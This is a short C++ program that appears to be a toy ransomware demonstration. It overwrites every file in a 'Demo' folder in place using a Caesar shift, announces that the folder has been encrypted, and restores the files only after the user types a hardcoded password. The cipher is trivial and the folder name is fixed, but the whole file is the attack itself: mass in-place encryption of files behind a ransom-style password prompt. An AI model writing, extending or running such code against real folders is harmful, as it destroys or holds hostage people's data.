#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>

// reading the content of the currently selected file
std::vector<std::string> readFile(std::string path) {
    std::vector<std::string> content;
    std::ifstream myfile(path);
    std::string line;
    if(myfile.is_open()) {
        while(getline(myfile, line)) {
            content.push_back(line);
        }
        myfile.close();
    }
    return content;
}

// writing the changes to the currently selected file
void writeFile(std::string path, std::vector<std::string> content) {
    std::ofstream file(path);
    if(file.is_open()) {
        for(std::string line : content) {
            file << line << "\n";
        }
        file.close();
    }
}

// using Caesar cipher for encryption
void encrypt(std::string path, int& shift) {
    std::vector<std::string> content = readFile(path);
    for(auto& line : content) {
        for(int i = 0; i < line.length(); i++) {
            line[i] = line[i] + shift;
        }
    }
    writeFile(path, content);
}

// using Caesar cipher for decryption
void decrypt(std::string path, int& shift) {
    std::vector<std::string> content = readFile(path);
    for(auto& line : content) {
        for(int i = 0; i < line.length(); i++) {
            line[i] = line[i] - shift;
        }
    }
    writeFile(path, content);
}


int main() {
    int shift = 10;
    std::string path = "Demo"; // path to the folder that shall be used
    std::vector<std::string> files;
    // iterate over all files in the folder and encrypt them
    for (const auto& entry : std::filesystem::directory_iterator(path)) {
        std::string filePath = entry.path().string();
        encrypt(filePath, shift);
        files.push_back(filePath);
    }

    std::cout << "Your folder Demo has been encrypted!" << std::endl;
    std::cout << "To decrypt the folder enter the right password: ";

    std::string password;
    std::cin >> password;
    while (password != "password") {
        std::cout << "Wrong password try again: ";
        std::cin >> password;
    }

    // decrypt all files
    for (std::string file : files) {
        decrypt(file, shift);
    }

    return 0;
}